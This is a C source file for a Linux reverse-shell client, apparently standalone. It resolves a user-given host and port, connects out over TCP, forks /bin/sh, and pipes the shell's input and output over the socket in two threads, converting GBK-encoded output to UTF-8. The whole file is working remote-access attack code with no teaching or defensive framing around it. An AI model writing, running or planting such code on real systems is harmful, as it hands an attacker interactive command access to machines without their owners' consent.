#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netdb.h>
#include <sys/select.h>
#include "gbk_linux.h"

int sock = -1;
int stdin_pipe[2];
int stdout_pipe[2];

typedef struct {
    const char* host;
    int port;
    int numeric_only;
    int timeout_seconds;
} ProgramOptions;

static void print_usage(const char* program_name) {
    printf("Usage: %s [-n] [-w seconds] <IP_OR_HOST> <PORT>\n", program_name);
}

static int parse_port(const char* text, int* out_value) {
    char* end = NULL;
    long value = strtol(text, &end, 10);
    if (text == NULL || *text == '\0' || end == NULL || *end != '\0' || value <= 0 || value > 65535) {
        return 0;
    }
    *out_value = (int)value;
    return 1;
}

static int parse_timeout_seconds(const char* text, int* out_value) {
    char* end = NULL;
    long value = strtol(text, &end, 10);
    if (text == NULL || *text == '\0' || end == NULL || *end != '\0' || value <= 0 || value > 86400) {
        return 0;
    }
    *out_value = (int)value;
    return 1;
}

static int parse_arguments(int argc, char* argv[], ProgramOptions* options) {
    int i;
    const char* host = NULL;
    const char* port_text = NULL;

    options->host = NULL;
    options->port = 0;
    options->numeric_only = 0;
    options->timeout_seconds = 0;

    for (i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-n") == 0) {
            options->numeric_only = 1;
            continue;
        }
        if (strcmp(argv[i], "-w") == 0) {
            if (i + 1 >= argc || !parse_timeout_seconds(argv[i + 1], &options->timeout_seconds)) {
                fprintf(stderr, "Invalid timeout seconds: %s\n", (i + 1 < argc) ? argv[i + 1] : "(missing)");
                return 0;
            }
            ++i;
            continue;
        }
        if (argv[i][0] == '-' && argv[i][1] != '\0') {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            return 0;
        }
        if (host == NULL) {
            host = argv[i];
        } else if (port_text == NULL) {
            port_text = argv[i];
        } else {
            fprintf(stderr, "Too many positional arguments.\n");
            return 0;
        }
    }

    if (host == NULL || port_text == NULL) {
        return 0;
    }

    if (!parse_port(port_text, &options->port)) {
        fprintf(stderr, "Invalid port number: %s\n", port_text);
        return 0;
    }

    options->host = host;
    return 1;
}

static int resolve_ipv4_address(const ProgramOptions* options, struct sockaddr_in* server) {
    memset(server, 0, sizeof(*server));
    server->sin_family = AF_INET;
    server->sin_port = htons((unsigned short)options->port);

    if (options->numeric_only) {
        if (inet_pton(AF_INET, options->host, &server->sin_addr) != 1) {
            fprintf(stderr, "Invalid numeric IPv4 address: %s\n", options->host);
            return 0;
        }
        return 1;
    }

    {
        struct addrinfo hints;
        struct addrinfo* result = NULL;
        char port_text[16];
        int rc;

        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        snprintf(port_text, sizeof(port_text), "%d", options->port);
        rc = getaddrinfo(options->host, port_text, &hints, &result);
        if (rc != 0 || result == NULL) {
            fprintf(stderr, "Resolve failed: %s\n", options->host);
            if (result != NULL) {
                freeaddrinfo(result);
            }
            return 0;
        }

        memcpy(server, result->ai_addr, sizeof(*server));
        freeaddrinfo(result);
        return 1;
    }
}

static int connect_with_timeout(int socket_fd, const struct sockaddr_in* server, int timeout_seconds) {
    int flags;
    int rc;

    if (timeout_seconds <= 0) {
        return connect(socket_fd, (const struct sockaddr*)server, sizeof(*server));
    }

    flags = fcntl(socket_fd, F_GETFL, 0);
    if (flags < 0) {
        return -1;
    }
    if (fcntl(socket_fd, F_SETFL, flags | O_NONBLOCK) < 0) {
        return -1;
    }

    rc = connect(socket_fd, (const struct sockaddr*)server, sizeof(*server));
    if (rc < 0) {
        if (errno != EINPROGRESS) {
            fcntl(socket_fd, F_SETFL, flags);
            return -1;
        }

        {
            fd_set writefds;
            fd_set exceptfds;
            struct timeval tv;
            int so_error = 0;
            socklen_t so_error_len = sizeof(so_error);

            FD_ZERO(&writefds);
            FD_ZERO(&exceptfds);
            FD_SET(socket_fd, &writefds);
            FD_SET(socket_fd, &exceptfds);

            tv.tv_sec = timeout_seconds;
            tv.tv_usec = 0;

            rc = select(socket_fd + 1, NULL, &writefds, &exceptfds, &tv);
            if (rc == 0) {
                errno = ETIMEDOUT;
                fcntl(socket_fd, F_SETFL, flags);
                return -1;
            }
            if (rc < 0) {
                fcntl(socket_fd, F_SETFL, flags);
                return -1;
            }
            if (getsockopt(socket_fd, SOL_SOCKET, SO_ERROR, &so_error, &so_error_len) < 0) {
                fcntl(socket_fd, F_SETFL, flags);
                return -1;
            }
            if (so_error != 0) {
                errno = so_error;
                fcntl(socket_fd, F_SETFL, flags);
                return -1;
            }
        }
    }

    if (fcntl(socket_fd, F_SETFL, flags) < 0) {
        return -1;
    }

    return 0;
}

int is_valid_utf8(const char* str) {
    const unsigned char* bytes = (const unsigned char*)str;
    while (*bytes) {
        if (*bytes <= 0x7F) {
            bytes += 1;
        } else if ((bytes[0] & 0xE0) == 0xC0 &&
                   (bytes[1] & 0xC0) == 0x80) {
            bytes += 2;
        } else if ((bytes[0] & 0xF0) == 0xE0 &&
                   (bytes[1] & 0xC0) == 0x80 &&
                   (bytes[2] & 0xC0) == 0x80) {
            bytes += 3;
        } else if ((bytes[0] & 0xF8) == 0xF0 &&
                   (bytes[1] & 0xC0) == 0x80 &&
                   (bytes[2] & 0xC0) == 0x80 &&
                   (bytes[3] & 0xC0) == 0x80) {
            bytes += 4;
        } else {
            return 0;
        }
    }
    return 1;
}

void* ReadOutputThread(void* arg) {
    char buffer[1024];
    ssize_t bytesRead;
    while ((bytesRead = read(stdout_pipe[0], buffer, sizeof(buffer) - 1)) > 0) {
        buffer[bytesRead] = '\0';

        if (is_valid_utf8(buffer)) {
            send(sock, buffer, bytesRead, 0);
        } else {
            char* utf8_buf = gbk_to_utf8(buffer);
            if (utf8_buf) {
                send(sock, utf8_buf, strlen(utf8_buf), 0);
                free(utf8_buf);
            } else {
                send(sock, buffer, bytesRead, 0);
            }
        }
    }
    return NULL;
}

void* SocketReadThread(void* arg) {
    char buffer[512];
    ssize_t bytesRead;

    while ((bytesRead = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
        write(stdin_pipe[1], buffer, bytesRead);
    }
    return NULL;
}

int main(int argc, char* argv[]) {
    ProgramOptions options;
    struct sockaddr_in server;

    if (!parse_arguments(argc, argv, &options)) {
        print_usage(argv[0]);
        return 1;
    }

    if (!resolve_ipv4_address(&options, &server)) {
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        return 1;
    }

    if (connect_with_timeout(sock, &server, options.timeout_seconds) == -1) {
        if (errno == ETIMEDOUT) {
            fprintf(stderr, "Connect timeout after %d seconds\n", options.timeout_seconds);
        } else {
            perror("Connect failed");
        }
        close(sock);
        return 1;
    }

    pipe(stdin_pipe);
    pipe(stdout_pipe);

    {
        pid_t pid = fork();
        if (pid == 0) {
            dup2(stdin_pipe[0], 0);
            dup2(stdout_pipe[1], 1);
            dup2(stdout_pipe[1], 2);

            close(stdin_pipe[1]);
            close(stdout_pipe[0]);

            execl("/bin/sh", "sh", NULL);

            perror("execl failed");
            exit(1);
        } else if (pid > 0) {
            pthread_t tid1, tid2;

            close(stdin_pipe[0]);
            close(stdout_pipe[1]);

            pthread_create(&tid1, NULL, ReadOutputThread, NULL);
            pthread_create(&tid2, NULL, SocketReadThread, NULL);

            wait(NULL);

            close(sock);
            close(stdin_pipe[1]);
            close(stdout_pipe[0]);
        } else {
            perror("fork failed");
            close(sock);
            return 1;
        }
    }

    return 0;
}
